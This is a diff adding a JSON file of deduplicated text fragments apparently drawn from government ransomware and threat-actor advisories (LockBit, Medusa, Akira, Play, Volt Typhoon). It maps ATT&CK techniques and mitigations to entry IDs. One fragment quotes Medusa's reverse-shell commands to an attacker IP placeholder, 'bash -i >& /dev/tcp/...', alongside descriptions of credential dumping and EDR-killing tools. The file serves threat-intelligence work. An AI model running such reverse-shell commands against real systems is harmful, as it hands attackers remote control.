@@ -1,0 +1,1598 @@
+[
+  {
+    "canonical": "thistechniquecannotbeeasilymitigatedwithpreventivecontrolssinceitisbasedonbehaviorsperformedoutsideofthescopeofenterprisedefensesandcontrols",
+    "text": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.",
+    "entries": [
+      "P001",
+      "P001",
+      "P002",
+      "P002",
+      "P004",
+      "P004",
+      "P006",
+      "P006",
+      "P008",
+      "P009",
+      "P009",
+      "P010",
+      "P010",
+      "P010",
+      "P013",
+      "P013",
+      "P014",
+      "P015",
+      "P016",
+      "P016",
+      "P022",
+      "P022",
+      "P027",
+      "P027",
+      "P028",
+      "P028",
+      "P029",
+      "P030",
+      "P030",
+      "P048",
+      "P048",
+      "P052",
+      "P052",
+      "P054",
+      "P054",
+      "P060",
+      "P060",
+      "P061",
+      "P071",
+      "P071",
+      "P078"
+    ],
+    "number": 1
+  },
+  {
+    "canonical": "attckrelease171techniquedevelopcapabilitiestl587mitigationprecompromisemi056",
+    "text": "ATT&CK release: 17.1 Technique: Develop Capabilities (Tl 587) Mitigation: Pre-compromise (MI 056)",
+    "entries": [
+      "P001",
+      "P002",
+      "P004",
+      "P006",
+      "P008",
+      "P009",
+      "P010",
+      "P013",
+      "P014",
+      "P015",
+      "P016",
+      "P022",
+      "P027",
+      "P028",
+      "P029",
+      "P030",
+      "P048",
+      "P052",
+      "P054",
+      "P060",
+      "P061",
+      "P071",
+      "P078"
+    ],
+    "number": 2
+  },
+  {
+    "canonical": "considerremovingpreviousversionsoftoolsthatareunnecessarytotheenvironmentwhenpossible",
+    "text": "Consider removing previous versions of tools that are unnecessary to the environment when possible.",
+    "entries": [
+      "P001",
+      "P002",
+      "P004",
+      "P006",
+      "P016",
+      "P022",
+      "P027",
+      "P030",
+      "P052",
+      "P071"
+    ],
+    "number": 3
+  },
+  {
+    "canonical": "attckrelease171techniqueimpairdefensestl562mitigationdisableorremovefeatureorprogrammi042",
+    "text": "ATT&CK release: 17.1 Technique: Impair Defenses (Tl 562) Mitigation: Disable or Remove Feature or Program (MI 042)",
+    "entries": [
+      "P001",
+      "P002",
+      "P004",
+      "P006",
+      "P016",
+      "P022",
+      "P027",
+      "P030",
+      "P052",
+      "P071"
+    ],
+    "number": 4
+  },
+  {
+    "canonical": "useapplicationcontrolwhereappropriateespeciallyregardingtheexecutionoftoolsoutsideoftheorganizationssecuritypoliciessuchasrootkitremovaltoolsthathavebeenabusedtoimpairsystemdefensesensurethatonlyapprovedsecurityapplicationsareusedandrunningonenterprisesystems",
+    "text": "Use application control where appropriate, especially regarding the execution of tools outside of the organization's security policies (such as rootkit removal tools) that have been abused to impair system defenses. Ensure that only approved security applications are used and running on enterprise systems.",
+    "entries": [
+      "P001",
+      "P001",
+      "P002",
+      "P004",
+      "P004",
+      "P006",
+      "P009",
+      "P010",
+      "P013",
+      "P016",
+      "P022",
+      "P027",
+      "P028",
+      "P030",
+      "P048",
+      "P052",
+      "P052",
+      "P071"
+    ],
+    "number": 5
+  },
+  {
+    "canonical": "attckrelease171techniqueimpairdefensestl562mitigationexecutionpreventionmi038",
+    "text": "ATT&CK release: 17.1 Technique: Impair Defenses (Tl 562) Mitigation: Execution Prevention (MI 038)",
+    "entries": [
+      "P001",
+      "P002",
+      "P004",
+      "P006",
+      "P009",
+      "P010",
+      "P013",
+      "P016",
+      "P022",
+      "P027",
+      "P028",
+      "P030",
+      "P048",
+      "P052",
+      "P071"
+    ],
+    "number": 6
+  },
+  {
+    "canonical": "attckrelease171techniquecompromiseaccountstl586mitigationprecompromisemi056",
+    "text": "ATT&CK release: 17.1 Technique: Compromise Accounts (Tl 586) Mitigation: Pre-compromise (MI 056)",
+    "entries": [
+      "P001",
+      "P002",
+      "P004",
+      "P006",
+      "P009",
+      "P010",
+      "P013",
+      "P016",
+      "P022",
+      "P027",
+      "P028",
+      "P030",
+      "P048",
+      "P052",
+      "P054",
+      "P060",
+      "P071"
+    ],
+    "number": 7
+  },
+  {
+    "canonical": "attckrelease171techniquedisableormodifytoolstl562001mitigationexecutionpreventionmi038",
+    "text": "ATT&CK release: 17.1 Technique: Disable or Modify Tools (Tl 562.001) Mitigation: Execution Prevention (MI 038)",
+    "entries": [
+      "P001",
+      "P004",
+      "P052"
+    ],
+    "number": 8
+  },
+  {
+    "canonical": "ensureproperregistrypermissionsareinplacetopreventadversariesfromdisablingorinterferingwithsecurityloggingservices",
+    "text": "Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security/logging services.",
+    "entries": [
+      "P002",
+      "P016",
+      "P030"
+    ],
+    "number": 9
+  },
+  {
+    "canonical": "attckrelease171techniqueimpairdefensestl562mitigationrestrictregistrypermissionsmi024",
+    "text": "ATT&CK release: 17.1 Technique: Impair Defenses (Tl 562) Mitigation: Restrict Registry Permissions (MI 024)",
+    "entries": [
+      "P002",
+      "P016",
+      "P030"
+    ],
+    "number": 10
+  },
+  {
+    "canonical": "bit30actorsuseanydeskaterarmmscreenconnectorteamviewerforc2table15lockbitaffiliatesattcktechniquesforenterpriseexfiltration",
+    "text": "Bit 3.0 actors use AnyDesk, Atera RMM, ScreenConnect or TeamViewer for C2. Table 15: LockBit Affiliates' ATT&CK Techniques for Enterprise — Exfiltration",
+    "entries": [
+      "P003",
+      "P037",
+      "P046",
+      "P067"
+    ],
+    "number": 11
+  },
+  {
+    "canonical": "understandingransomwarethreatactorslockbit",
+    "text": "Understanding Ransomware Threat Actors: LockBit",
+    "entries": [
+      "P003",
+      "P008",
+      "P012",
+      "P014",
+      "P015",
+      "P019",
+      "P020",
+      "P021",
+      "P029",
+      "P031",
+      "P033",
+      "P034",
+      "P036",
+      "P037",
+      "P038",
+      "P043",
+      "P046",
+      "P047",
+      "P051",
+      "P053",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P064",
+      "P065",
+      "P067",
+      "P073",
+      "P079"
+    ],
+    "number": 12
+  },
+  {
+    "canonical": "table11lockbitaffiliatesattcktechniquesforenterprisediscovery",
+    "text": "Table 11: LockBit Affiliates' ATT&CK Techniques for Enterprise — Discovery",
+    "entries": [
+      "P003",
+      "P020",
+      "P029",
+      "P037",
+      "P046",
+      "P054",
+      "P060",
+      "P061",
+      "P067",
+      "P079"
+    ],
+    "number": 13
+  },
+  {
+    "canonical": "notethisadvisoryusesthemitreattckmatrixforenterpriseframeworkversion19seethemitreattcktacticsandtechniquessectionofthisadvisoryforatableofthethreatactorsactivitymappedtomitreattcktacticsandtechniquesbackgroundupdatedaug182026since2021medusaactorshaveusedthemedusavarianttoconductransomwareattacksthroughatleastapril2026medusaoriginallyoperatedasaclosedransomwareoperationmeaningthesamegroupofcyberthreatactorscontrolledalldevelopmentandassociatedransomwarecampaignssinceatleastearly2023medusaprogressedtousinganaffiliatemodelsellingraastoaffiliateswhoaregrantedvaryinglevelsoftrustbaseduponexperienceandprofitabilityfornewerorlessexperiencedaffiliatesimportantoperationssuchasransomnegotiationmaybecentrallycontrolledbythedevelopersmedusaactorsuseadoubleextortionmodelwheretheyencr",
+    "text": "Note: This advisory uses the MITRE ATT&CK@ Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors' activity mapped to MITRE ATT&CK tactics and techniques. Background (Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr",
+    "entries": [
+      "P003",
+      "P005",
+      "P037",
+      "P046",
+      "P066",
+      "P077"
+    ],
+    "number": 14
+  },
+  {
+    "canonical": "sviagrouppolicyobjectstable9playattcktechniquesforenterpriseforcollectiontechniquetitleusearchivecollecteddataarchiveviautilitytl560001playransomwareactorsusetoolslikewinrartocompressfilestable10playattcktechniquesforenterpriseforexfiltrationtechniquetitleuseexfiltrationoveralternativeprotocolt1048playransomwareactorsusefiletransfertoolslikewinscptotransferdatatable11playattcktechniquesforenterpriseforimpacttechniquetitleusedataencryptedforimpactt1486playransomwareactorsencryptdataontargetsystemstointerruptavailabilitytosystemandnetworkresourcesfinancialtheftt1657playransomwareactorsuseadoubleextortionmodelforfinancialgainupdatejune42025",
+    "text": "s via Group Policy Objects. Table 9: Play ATT&CK Techniques for Enterprise for Collection Technique Title Use Archive Collected Data: Archive via Utility Tl 560.001 Play ransomware actors use tools like WinRAR to compress files. Table 10: Play ATT&CK Techniques for Enterprise for Exfiltration Technique Title Use Exfiltration Over Alternative Protocol T 1048 Play ransomware actors use file transfer tools like WinSCP to transfer data. Table 11: Play ATT&CK Techniques for Enterprise for Impact Technique Title Use Data Encrypted for Impact T 1486 Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources. Financial Theft T 1657 Play ransomware actors use a double-extortion model for financial gain. Update June 4, 2025:",
+    "entries": [
+      "P003",
+      "P037",
+      "P046"
+    ],
+    "number": 15
+  },
+  {
+    "canonical": "whenprovidedwithvalidusernameandpasswordcredentialsmedusaactorsusepsexecto",
+    "text": "When provided with valid username and password credentials, Medusa actors use PsExec to:",
+    "entries": [
+      "P005",
+      "P066",
+      "P076"
+    ],
+    "number": 16
+  },
+  {
+    "canonical": "ablebeyondtrustsimplehelpandsplashtopmedusaactorsusethesetoolsincombinationwithremotedesktopprotocolrdpt1021001andpsexectl569002tomovelaterallyta0008throughthenetworkandidentifyfilesforexfiltrationtaooioandencryptiont1486whenprovidedwithvalidusernameandpasswordcredentialsmedusaactorsusepsexecto",
+    "text": "-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T 1021.001] and PsExec [Tl 569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TAOOIO] and encryption [T 1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:",
+    "entries": [
+      "P005",
+      "P066",
+      "P077"
+    ],
+    "number": 17
+  },
+  {
+    "canonical": "commandstocreateareversetransmissioncontrolprotocoltcpconnectiontothreatactorinfrastructurebashidevtcpattackerip444401bashidevtcpattackerip44301gsocketalsoknownasglobalsocketorgsnetcatallowsworkstationsondifferentprivatenetworkstoconnectandbypassfirewallsallowsfiletransfersandcommandexecutionlateralmovementcredentialaccessandexecutionupdatedaug182026medusaactorsuseavarietyoflegitimateremotemonitoringandmanagementrmmsoftwaret1219toevadedetectiontheymaytailortheirchoicebasedonremoteaccesstoolsalreadypresentinthevictimenvironment23fbiidentifiedmedusaactorsusingremoteaccesssoftwareanydeskateraconnectwiseehorusnablebeyondtrustsimplehelpandsplashtopmedusaactorsusethesetoolsincombinationwithremotedesktopprotocolrdpt1021001andps",
+    "text": "commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure: bash -i >& /dev/tcp/<attacker IP >/4444 0>&1 bash -i >& /dev/tcp/<attacker IP >/443 0>&1 GSocket Also known as Global Socket or gs-netcat. Allows workstations on different private networks to connect and bypass firewalls. Allows file transfers and command execution. Lateral Movement, Credential Access, and Execution (Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T 1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps",
+    "entries": [
+      "P005",
+      "P066",
+      "P077"
+    ],
+    "number": 18
+  },
+  {
+    "canonical": "thistechniquecannotbeeasilymitigatedwithpreventivecontrolssinceitisbasedonbehaviorsperformedoutsideofthescopeofenterprisedefensesandcontrolseffortsshouldfocusonminimizingtheamountandsensitivityofdataavailabletoexternalparties",
+    "text": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.",
+    "entries": [
+      "P006",
+      "P010",
+      "P022",
+      "P027",
+      "P028",
+      "P061",
+      "P071"
+    ],
+    "number": 19
+  },
+  {
+    "canonical": "attckrelease171techniqueemailaddressestl589002mitigationprecompromisemi056",
+    "text": "ATT&CK release: 17.1 Technique: Email Addresses (Tl 589.002) Mitigation: Pre-compromise (MI 056)",
+    "entries": [
+      "P006",
+      "P010",
+      "P022",
+      "P027",
+      "P028",
+      "P061",
+      "P071"
+    ],
+    "number": 20
+  },
+  {
+    "canonical": "akirathreatactorsusetoolslikemimikatzandlazagnetodumpcredentials",
+    "text": "Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.",
+    "entries": [
+      "P007",
+      "P012",
+      "P021",
+      "P033",
+      "P043",
+      "P044",
+      "P047",
+      "P049",
+      "P053",
+      "P064",
+      "P065",
+      "P073"
+    ],
+    "number": 21
+  },
+  {
+    "canonical": "advancedportscannerperformsnetworkscansfindsopentransmissioncontrolprotocoltcpanduserdataprotocoludpportsforexploitationt1046networkservicediscovery",
+    "text": "Advanced Port Scanner Performs network scans. Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation. T 1046 Network Service Discovery",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P079"
+    ],
+    "number": 22
+  },
+  {
+    "canonical": "table4freewareandopensourcetoolsusedbylockbitaffiliates",
+    "text": "Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P017",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P057",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P067",
+      "P079"
+    ],
+    "number": 23
+  },
+  {
+    "canonical": "toolintendeduserepurposedusebylockbitaffiliatesmitreattckid",
+    "text": "Tool Intended Use Repurposed Use by LockBit Affiliates MITRE ATT&CK ID",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P017",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P057",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P067",
+      "P079"
+    ],
+    "number": 24
+  },
+  {
+    "canonical": "attckrelease171techniquenetworkservicediscoveryt1046mitigationnetworksegmentationmi030",
+    "text": "ATT&CK release: 17.1 Technique: Network Service Discovery (T 1046) Mitigation: Network Segmentation (MI 030)",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061"
+    ],
+    "number": 25
+  },
+  {
+    "canonical": "ensurepropernetworksegmentationisfollowedtoprotectcriticalserversanddevices",
+    "text": "Ensure proper network segmentation is followed to protect critical servers and devices.",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061"
+    ],
+    "number": 26
+  },
+  {
+    "canonical": "anydeskenablesremoteconnectionstonetworkdevicesenablesremotecontrolofvictimsnetworkdevicest1219remoteaccesssoftware",
+    "text": "AnyDesk Enables remote connections to network devices. Enables remote control of victim's network devices. T 1219 Remote Access Software",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P017",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P057",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P067",
+      "P079"
+    ],
+    "number": 27
+  },
+  {
+    "canonical": "attckrelease171techniqueremoteaccesstoolstl219mitigationnetworkintrusionpreventionm1031",
+    "text": "ATT&CK release: 17.1 Technique: Remote Access Tools (Tl 219) Mitigation: Network Intrusion Prevention (M 1031)",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P078"
+    ],
+    "number": 28
+  },
+  {
+    "canonical": "networkintrusiondetectionandpreventionsystemsthatusenetworksignaturesmaybeabletopreventtraffictoremoteaccessservices",
+    "text": "Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P078"
+    ],
+    "number": 29
+  },
+  {
+    "canonical": "ateraremotemonitoringmanagementrmmenablesremoteconnectionstonetworkdevicesenablesremotecontrolofvictimsnetworkdevicest1219remoteaccesssoftware",
+    "text": "Atera Remote Monitoring & Management (RMM) Enables remote connections to network devices. Enables remote control of victim's network devices. T 1219 Remote Access Software",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P017",
+      "P020",
+      "P029",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P054",
+      "P058",
+      "P059",
+      "P060",
+      "P061",
+      "P067",
+      "P079"
+    ],
+    "number": 30
+  },
+  {
+    "canonical": "backstabterminatesantimalwareprotectedprocessesterminatesendpointdetectionandresponseedrprotectedprocessestl562001impairdefensesdisableormodifytools",
+    "text": "Backstab Terminates antimalware-protected processes. Terminates endpoint detection and response (EDR)- protected processes. Tl 562.001 Impair Defenses: Disable or Modify Tools",
+    "entries": [
+      "P008",
+      "P014",
+      "P015",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P051",
+      "P058",
+      "P059"
+    ],
+    "number": 31
+  },
+  {
+    "canonical": "attckrelease171techniquedisableormodifytoolstl562001mitigationuseraccountmanagementmi018",
+    "text": "ATT&CK release: 17.1 Technique: Disable or Modify Tools (Tl 562.001) Mitigation: User Account Management (MI 018)",
+    "entries": [
+      "P008",
+      "P009",
+      "P013",
+      "P014",
+      "P015",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P048",
+      "P051",
+      "P058",
+      "P059"
+    ],
+    "number": 32
+  },
+  {
+    "canonical": "ensureproperuserpermissionsareinplacetopreventadversariesfromdisablingorinterferingwithsecurityservices",
+    "text": "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.",
+    "entries": [
+      "P008",
+      "P009",
+      "P013",
+      "P014",
+      "P015",
+      "P031",
+      "P034",
+      "P036",
+      "P038",
+      "P048",
+      "P051",
+      "P058",
+      "P059"
+    ],
+    "number": 33
+  },
+  {
+    "canonical": "lockbitaffiliateshaveusedmimikatztodumpcredentials",
+    "text": "LockBit affiliates have used Mimikatz to dump credentials.",
+    "entries": [
+      "P008",
+      "P012",
+      "P014",
+      "P015",
+      "P021",
+      "P031",
+      "P033",
+      "P034",
+      "P036",
+      "P038",
+      "P043",
+      "P047",
+      "P051",
+      "P053",
+      "P058",
+      "P059",
+      "P064",
+      "P065",
+      "P073"
+    ],
+    "number": 34
+  },
+  {
+    "canonical": "understandinqransomwarethreatactorslockbitlockbitaffiliateshaveusedmimikatztodumpcredentials",
+    "text": "Understandinq Ransomware Threat Actors: LockBit LockBit affiliates have used Mimikatz to dump credentials.",
+    "entries": [
+      "P008"
+    ],
+    "number": 35
+  },
+  {
+    "canonical": "table9lockbitaffiliatesattcktechniquesforenterprisedefenseevasion",
+    "text": "Table 9: LockBit Affiliates' ATT&CK Techniques for Enterprise — Defense Evasion",
+    "entries": [
+      "P008",
+      "P012",
+      "P014",
+      "P015",
+      "P021",
+      "P031",
+      "P033",
+      "P034",
+      "P036",
+      "P038",
+      "P043",
+      "P047",
+      "P051",
+      "P053",
+      "P058",
+      "P059",
+      "P064",
+      "P065",
+      "P073"
+    ],
+    "number": 36
+  },
+  {
+    "canonical": "ensureproperuserpermissionsareinplacetopreventadversariesfromdisablingorinterferingwithsecurityloggingservices",
+    "text": "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services.",
+    "entries": [
+      "P009",
+      "P013",
+      "P028",
+      "P048"
+    ],
+    "number": 37
+  },
+  {
+    "canonical": "attckrelease171techniqueimpairdefensestl562mitigationuseraccountmanagementmi018",
+    "text": "ATT&CK release: 17.1 Technique: Impair Defenses (Tl 562) Mitigation: User Account Management (MI 018)",
+    "entries": [
+      "P009",
+      "P013",
+      "P028",
+      "P048"
+    ],
+    "number": 38
+  },
+  {
+    "canonical": "attckrelease171techniquemalwaretl587001mitigationprecompromisem1056",
+    "text": "ATT&CK release: 17.1 Technique: Malware (Tl 587.001) Mitigation: Pre-compromise (M 1056)",
+    "entries": [
+      "P010"
+    ],
+    "number": 39
+  },
+  {
+    "canonical": "beaconsakirathreatactorsusestonestopmalwaretoloadadditionalpayloadsendupdateremoteaccesssoftwaret1219akirathreatactorsuselegitimatedesktopsupportsoftwarelikeanydesktoobtainremoteaccesstovictimsystemsupdatenov132025akirathreatactorsusesystembcmalwareasaratendupdateupdatenov132025protocoltunnelingt1572akiratreatactorsusengroktohidec2andremoteaccessexfiltratetrafficinsidelegitimatehttpsconnectionsbypassperimeterdefensesandmaintaincovertpersistentaccessendupdatetable20exfiltrationtechniquetitle",
+    "text": "beacons. Akira threat actors use STONESTOP malware to load additional payloads. End Update Remote Access Software T 1219 Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems. Update Nov. 13, 2025 Akira threat actors use SystemBC malware as a RAT. End Update Update Nov. 13, 2025 Protocol Tunneling T 1572 Akira treat actors use Ngrok to hide C2 and remote access/exfiltrate traffic inside legitimate HTTPS connections, bypass perimeter defenses, and maintain covert persistent access. End Update Table 20. Exfiltration Technique Title",
+    "entries": [
+      "P011"
+    ],
+    "number": 40
+  },
+  {
+    "canonical": "trainuserstobeawareofimpersonationtricksandhowtocounterthemforexampleconfirmingincomingrequeststhroughanindependentplatformlikeaphonecallorinpersontoreducerisk",
+    "text": "Train users to be aware of impersonation tricks and how to counter them, for example confirming incoming requests through an independent platform like a phone call or in-person, to reduce risk.",
+    "entries": [
+      "P011",
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 41
+  },
+  {
+    "canonical": "attckrelease171techniqueimpersonationtl656mitigationusertrainingmi017",
+    "text": "ATT&CK release: 17.1 Technique: Impersonation (Tl 656) Mitigation: User Training (MI 017)",
+    "entries": [
+      "P011",
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 42
+  },
+  {
+    "canonical": "suchasfiletransferprotocolftpsecurefiletransferprotocolsftpandcloudstorageserviceslikemegatl537toconnecttoexfiltrationserversinsomeinstancesakirathreatactorsusengroktocreatesecuretunnelsfordataexfiltrationt1090afterexfiltratingdataakirathreatactorsuseadoubleextortionmodelt1657whichinvolvesthreatactorsbothencryptingsystemst1486andthreateningtoleaksensitiveinformationtheakiraransomnoteprovideseachcompanywithauniquecodeandinstructionstocontactthethreatactorsviaaonionurlwhichisaccessiblethroughthetornetworkt1090003tl573002notetorshortfortheonionrouterisadecentralizednetworkdesignedtoanonymizeinternettrafficbyroutingitthroughmultipleserversencryptingdataateachstepthisnetworkisoftenleveragedbythreatactorstoconcealtheiridentitiesandactivitiesenablingsecureand",
+    "text": "such as File Transfer Protocol (F TP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [Tl 537], to connect to exfiltration servers. In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T 1090]. After exfiltrating data, Akira threat actors use a double-extortion model [T 1657], which involves threat actors both encrypting systems [T 1486] and threatening to leak sensitive information. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T 1090.003] [Tl 573.002]. (Note: Tor, short for The Onion Router, is a decentralized network designed to anonymize internet traffic by routing it through multiple servers, encrypting data at each step. This network is often leveraged by threat actors to conceal their identities and activities, enabling secure and",
+    "entries": [
+      "P011",
+      "P074",
+      "P080"
+    ],
+    "number": 43
+  },
+  {
+    "canonical": "ifalinkisbeingvisitedbyausernetworkintrusionpreventionsystemsandsystemsdesignedtoscanandremovemaliciousdownloadscanbeusedtoblockactivity",
+    "text": "If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.",
+    "entries": [
+      "P011"
+    ],
+    "number": 44
+  },
+  {
+    "canonical": "attckrelease171techniqueuserexecutiont1204mitigationnetworkintrusionpreventionm1031",
+    "text": "ATT&CK release: 17.1 Technique: User Execution (T 1204) Mitigation: Network Intrusion Prevention (M 1031)",
+    "entries": [
+      "P011"
+    ],
+    "number": 45
+  },
+  {
+    "canonical": "considerfilteringnetworktraffictountrustedorknownbaddomainsandresources",
+    "text": "Consider filtering network traffic to untrusted or known bad domains and resources.",
+    "entries": [
+      "P011",
+      "P040",
+      "P041",
+      "P062",
+      "P070",
+      "P074",
+      "P080"
+    ],
+    "number": 46
+  },
+  {
+    "canonical": "attckrelease171techniqueprotocoltunnelingtl572mitigationfilternetworktrafficmi037",
+    "text": "ATT&CK release: 17.1 Technique: Protocol Tunneling (Tl 572) Mitigation: Filter Network Traffic (MI 037)",
+    "entries": [
+      "P011",
+      "P040",
+      "P041",
+      "P062",
+      "P070",
+      "P074",
+      "P080"
+    ],
+    "number": 47
+  },
+  {
+    "canonical": "theusauthoringagencieshaveobservedvolttyphoonactorsleveragingmimikatztoharvestcredentialsandindustrypartnershaveobservedvolttyphoonleveragingimpacket2",
+    "text": "The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]",
+    "entries": [
+      "P012",
+      "P033",
+      "P043",
+      "P047",
+      "P053",
+      "P064",
+      "P065",
+      "P073"
+    ],
+    "number": 48
+  },
+  {
+    "canonical": "prcstatesponsoredactorscompromiseandmaintainpersistentaccesstouscriticalinfrastructure",
+    "text": "PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure",
+    "entries": [
+      "P012",
+      "P033",
+      "P043",
+      "P047",
+      "P053",
+      "P064",
+      "P065",
+      "P073"
+    ],
+    "number": 49
+  },
+  {
+    "canonical": "phobosactorsusedmimikatztoexportcredentials",
+    "text": "Phobos actors used Mimikatz to export credentials.",
+    "entries": [
+      "P012",
+      "P064",
+      "P065"
+    ],
+    "number": 50
+  },
+  {
+    "canonical": "table16phobosthreatactorsattcktechniquesforenterprisedefenseevasion",
+    "text": "Table 16: Phobos Threat Actors ATT&CK Techniques for Enterprise — Defense Evasion",
+    "entries": [
+      "P012",
+      "P064",
+      "P065"
+    ],
+    "number": 51
+  },
+  {
+    "canonical": "blackbastaaffiliatesusecredentialscrapingtoolslikemimikatzforprivilegeescalation",
+    "text": "Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation.",
+    "entries": [
+      "P012",
+      "P064",
+      "P065"
+    ],
+    "number": 52
+  },
+  {
+    "canonical": "table1toolsusedbyblackbastaaffiliates",
+    "text": "Table 1: Tools Used by Black Basta Affiliates",
+    "entries": [
+      "P012",
+      "P064",
+      "P065"
+    ],
+    "number": 53
+  },
+  {
+    "canonical": "medusaactorsaccesscredentialmaterialstoredinprocessmemoryorlsassusingmimikatz",
+    "text": "Medusa actors access credential material stored in process memory or LSASS using Mimikatz.",
+    "entries": [
+      "P012",
+      "P064",
+      "P065"
+    ],
+    "number": 54
+  },
+  {
+    "canonical": "lockbit30affiliatesfailingtoenterthecorrectpasswordwillbeunabletoexecutetheransomwaret1480001",
+    "text": "LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware [T 1480.001].",
+    "entries": [
+      "P017",
+      "P039",
+      "P057"
+    ],
+    "number": 55
+  },
+  {
+    "canonical": "attckrelease171techniqueenvironmentalkeyingt1480001mitigationdonotmitigatem1055",
+    "text": "ATT&CK release: 17.1 Technique: Environmental Keying (T 1480.001) Mitigation: Do Not Mitigate (M 1055)",
+    "entries": [
+      "P017",
+      "P039",
+      "P057"
+    ],
+    "number": 56
+  },
+  {
+    "canonical": "environmentalkeyinghttpsattackmitreorgtechniquest1480001likelyshouldnotbemitigatedwithpreventativecontrolsbecauseitmayprotectunintendedtargetsfrombeingcompromisedviaconfusionofkeysbytheadversarymitigationofthistechniqueisalsounlikelytobefeasiblewithinmostcontextsbecausetherearenostandardattributesfromwhichanadversarymayderivekeysiftargetedeffortsshouldbefocusedonpreventingadversarytoolsfromrunningearlierinthechainofactivityandonidentifyingsubsequentmaliciousbehaviorifcompromised",
+    "text": "[Environmental Keying](https://attack.mitre.org/techniques/T1480/001) likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised via confusion of keys by the adversary. Mitigation of this technique is also unlikely to be feasible within most contexts because there are no standard attributes from which an adversary may derive keys. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised.",
+    "entries": [
+      "P017",
+      "P039",
+      "P057"
+    ],
+    "number": 57
+  },
+  {
+    "canonical": "afterfilesareencryptedlockbit30dropsaransomnotewiththenewfilenameransomwareidreadmetxtandchangesthehostswallpaperandiconstolockbit30brandingt1491001",
+    "text": "After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host's wallpaper and icons to LockBit 3.0 branding [T 1491.001].",
+    "entries": [
+      "P017"
+    ],
+    "number": 58
